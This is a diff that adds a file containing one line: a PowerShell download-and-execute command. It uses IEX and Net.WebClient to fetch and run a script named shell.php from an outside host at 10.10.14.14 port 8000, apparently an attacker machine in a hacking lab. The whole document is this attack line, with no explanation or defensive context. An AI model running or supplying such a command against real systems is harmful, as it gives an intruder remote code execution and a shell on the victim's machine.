@@ -1,0 +1,1 @@
+C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/shell.php')
